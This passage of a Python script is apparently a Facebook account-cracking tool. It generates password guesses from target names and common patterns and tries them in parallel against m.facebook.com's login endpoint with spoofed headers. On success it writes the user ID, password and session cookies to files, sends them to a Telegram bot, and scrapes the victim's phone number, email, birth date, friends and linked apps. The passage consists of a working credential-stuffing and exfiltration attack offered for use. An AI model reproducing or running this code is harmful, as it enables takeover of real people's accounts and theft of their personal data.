		exit()
#    print('>> 2. Free ')
    #print('>> 3. Touch  ')
  #  print('>> 4. Mbasic ')
	hc = '1'
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['']:
		print('>> PILIH YANG BENAR BANG ')
		setting()
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	taplikasi.append('no')
	pwplus='1'
	pwpluss.append('no')
	passwrd() 
def passwrd():
    clear()
    print(M + logo)
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf) < 6:
                if len(frs) < 3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append(frs + frs)
                    pwv.append(frs + ' ' + frs)
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('1122334455@@')
                    pwv.append('Aa123456')
                    pwv.append('mmmmnnnn')
                    pwv.append('nnnnmmmm')
                    pwv.append('mmnnbbvv')
                    pwv.append('zzzzxxxx')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('12345@12345')
                    pwv.append('123@123')
                    pwv.append('1234512345')
                    pwv.append('123412345')
                    pwv.append('1234554321')
                    pwv.append('00998877')
                    pwv.append('123456123456')
                    pwv.append('1122334455')
                    pwv.append('1q2w3e4r5t')
                    pwv.append('1q2w3e4r5t6y')
                    pwv.append('1020304050')
                    pwv.append('20222022')
                    pwv.append('aassddff')
                    pwv.append(frs + '123')
                    pwv.append(frs + '1234')
            elif len(frs) < 3:
                pwv.append(nmf)
            else:
                pwv.append(nmf)
                pwv.append('zzxxccvv')
                pwv.append('zzxxccvvbbnnmm')
                pwv.append('qqwweerrttyy')
                pwv.append('qqqqwwww')
                pwv.append('mmnnbbvvccxxzz')
                pwv.append('qqwweerrttyyuuiioopp')
                pwv.append('qwertyuiopasdfghjkl')
                pwv.append('aassddffgg')
                pwv.append('asdfasdf')
                pwv.append('qqwweerr')
                pwv.append('19761976')
                pwv.append('19901990')
                pwv.append('19751975')
                pwv.append('19891989')
                pwv.append('qqwweerrtt')
                pwv.append('12345qwert')
                pwv.append('qwertqwert')
                pwv.append('zxcvzxcv')
                pwv.append('19771977')
                pwv.append('aassdd')
                pwv.append('qqwwee')
                pwv.append('mnbvmnbv')
                pwv.append('qwertyuiopasdfghjklzxcvbnm')
                pwv.append('poiupoiu')
                pwv.append('mmnnbb')
                pwv.append('oooopppp')
                pwv.append('ppppoooo')
                pwv.append('qwertyqwerty')
                pwv.append('qwerqwer')
                pwv.append('665544332211')
                pwv.append('100020003000')
                pwv.append('123456123456')
                pwv.append('1122334455@@')
                pwv.append('11223344@@')
                pwv.append('11220055')
                pwv.append('1234512345@@')
                if 'ya' in pwpluss:
                 for xpwd in pwnya:
                    pwv.append(xpwd)
                else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(cracktouch,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic,idf,pwv)
            else:
                pool.submit(crackmbasic,idf,pwv)
    print('')

    print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
    print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
def crack(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = ''
    print('\r%s [حسيون🔥] %s/%s  ✨  [OK] %s ✨ [CP] %s ✨ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            tix = time.time()
            ses.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'Hesion': ua2,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': idf,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            ses.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'Hesion': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-user': 'empty',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate br',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''\
💀سكيور جرب تفتحه بعدين   
 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}

 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}

بلاء امر عليك دز صور صيد 
➩ @lIIHII 	'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title=' نشالله يجيك صحيح '))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statuscp))
            
            if 'c_user' in ses.cookies.get_dict().keys():
                headapp = {
                    'Hesion': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/937.36 (KHTML, like Gecko) Safari/420+' }
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''🔥حساب شغال                
 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}

 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}

𝘾𝙊𝙊𝙆𝙄𝙀𝙎׀\n{kuki}

➩ @lIIHII 
'''
                    statusok1 = nel(statusok, style='yellow')
                    cetak(nel(statusok1, title=''))
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(statusok))
                    infoaccount(kuki)

    
                if 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
    
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ''
                    session = requests.Session()
                    get_id = session.get('https://m.facebook.com/profile.php', cookies=coki, headers=headapp).text
                    nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                    response = session.get('https://m.facebook.com/profile.php?v=info', cookies=coki, headers=headapp).text
                    response2 = session.get('https://m.facebook.com/profile.php?v=friends', cookies=coki, headers=headapp).text
                    response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', cookies=coki, headers=headapp).text
                    response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                    except:
                        nomer = ''
                    
                    try:
                        email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                    except:
                        email = ''
                    
                    try:
                        ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                    except:
                        ttl = ''
                    
                    try:
                        teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                    except:
                        teman = ''
                    
                    try:
                        pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                    except:
                        pengikut = ''
                    
                    try:
                        tahun = ''
                        cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ', '
                    except:pass
                    infoakun += f'''🔥حساب شغال                
 𝗨𝗦𝗘𝗥𝗡𝗔𝗠׀\n{idf}

 𝗣𝗔𝗦𝗦𝗪𝗥𝗗׀\n {pw}

𝘾𝙊𝙊𝙆𝙄𝙀𝙎׀\n{kuki}
بلاء امر عليك دز صور صيد 
➩ @lIIHII 
'''
                    requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(infoakun))
                    (hit1, hit2) = (0, 0)
                    
                    cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headapp).text
                    cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', cookies=coki, headers=headapp).text
                    if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                        infoakun += 'Aplikasi Yang Terkait*\n'
                        if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                            infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                        else:
                            infoakun += '\tAplikasi Aktif : \n'
                            apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                            ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {ditambahkan[hit2]}\n'''
                                hit2 += 1
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += f'''\t\t[{hit1}] {muncul} {kadaluarsa[hit2]}\n'''
                                hit2 += 1
                    print('\n')
                    statusok = f'''\t\t\t\t\t\n   \n{infoakun}\t\t\t\t\t\n\t\t\t\t\t'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    cek_Hesion(kuki)
        except requests.exceptions.ConnectionError:
            time.sleep(31)

    loop += 1
def O():    
    try:
        os.remove('ID.txt')
        os.remove('ok.coki.txt')
        os.remove('.token.txt')
        os.remove('.cok.txt')
    except:
        exit()
def infoaccount(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➥ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➥ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__ == '__main__':    
    try:os.system('git pull')
    except:pass    
    try:os.mkdir('OK')
    except:pass    
    try:os.mkdir('CP')
    except:pass    
    try:os.mkdir('/sdcard/ALVINO-DUMP')
    except:pass    
    try:os.system('touch .prox.txt')
    except:pass    
    try:os.system('pkg install play-audio')
    except:pass    
    try:os.system('clear')
    except:pass	
menu()